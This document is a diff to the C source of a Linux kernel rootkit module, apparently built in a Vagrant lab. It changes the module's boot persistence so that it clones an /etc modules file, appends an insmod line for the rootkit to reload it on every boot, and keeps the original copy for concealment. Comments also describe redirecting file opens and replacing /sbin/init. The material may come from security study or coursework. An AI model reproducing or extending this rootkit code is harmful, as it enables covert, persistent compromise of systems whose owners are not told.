@@ -40,14 +40,15 @@ char hidePID[6] = "-1";
 
 // this is the c file which will replace /sbin/init
 // - it loads the rootkit then runs the original /sbin/init
-#define FILE_INIT_REPLACEMENT_C      "/vagrant/start_rootkit.c\0"
-#define FILE_INIT_REPLACEMENT_OUTPUT "/vagrant/start_rootkit\0"
+// #define FILE_INIT_REPLACEMENT_C      "/vagrant/start_rootkit.c\0"
+// #define FILE_INIT_REPLACEMENT_OUTPUT "/vagrant/start_rootkit\0"
 // #define FILE_INIT               "/sbin/init"
 // #define FILE_INIT_ORIGINAL      "/sbin/init_original"
 // #define FILE_INIT               "/vagrant/init_temp"
 // #define FILE_INIT_ORIGINAL      "/vagrant/init_temp_original"
-#define FILE_INIT               "/home/vagrant/pretend_sbin/fake_modules.txt\0"
-#define FILE_INIT_ORIGINAL      "/home/vagrant/pretend_sbin/fake_modules_original.txt\0"
+#define FILE_MODULES               "/etc/modules_copy\0"
+#define FILE_MODULES_ORIGINAL      "/etc/modules_copy_original\0"
+#define FILE_TO_APPEND             "/lib/modules/3.2.0-126-generic/kernel/drivers/rootkit/to_append.txt"
 
 // 'map' for replacement open operations
 // e.g. trying to open dog.txt will get you red.txt instead
@@ -473,7 +474,7 @@ int clone_file(const char* filename_old, const char* filename_new) {
         ret_new = vfs_write(filp_new, buf, 1, &pos_write);
     }
     // write NULLs for the rest, incase file already exists
-    buf[0] = NULL;
+    buf[0] = '\0';
     for (i = end; i < new_end; i++) {
         ret_new = vfs_write(filp_new, buf, 1, &pos_write);
     }
@@ -830,11 +831,11 @@ void add_to_reboot() {
     // delete_file("/home/vagrant/append_fun/try_deleting_me");
 
     // first boot only
-    if (!does_file_exist("/home/vagrant/append_fun/file_original")) {
+    if (!does_file_exist(FILE_MODULES_ORIGINAL)) {
         // on first boot, copy the original:
-        clone_file("/home/vagrant/append_fun/file", "/home/vagrant/append_fun/file_original");
+        clone_file(FILE_MODULES, FILE_MODULES_ORIGINAL);
         // & append 'insmod rookit' to the actual file
-        append_to_file("/home/vagrant/append_fun/file_to_append", "/home/vagrant/append_fun/file");
+        append_to_file(FILE_TO_APPEND, FILE_MODULES);
     }
 
     // redirect all access during
@@ -850,8 +851,10 @@ void add_to_reboot_exit() {
     //       even if this func. is not called the rootkit will
     //       be reloaded
     boot_loader_init = 0;
-    clone_file("/home/vagrant/append_fun/file_original", "/home/vagrant/append_fun/file");
-    append_to_file("/home/vagrant/append_fun/file_to_append", "/home/vagrant/append_fun/file");
+    // clone_file(FILE_MODULES_ORIGINAL, FILE_MODULES);
+    rename_file(FILE_MODULES_ORIGINAL, FILE_MODULES);
+    clone_file(FILE_MODULES, FILE_MODULES_ORIGINAL);
+    append_to_file(FILE_TO_APPEND, FILE_MODULES);
     // printk("why crash\n");
     boot_loader_init = 1;
 }
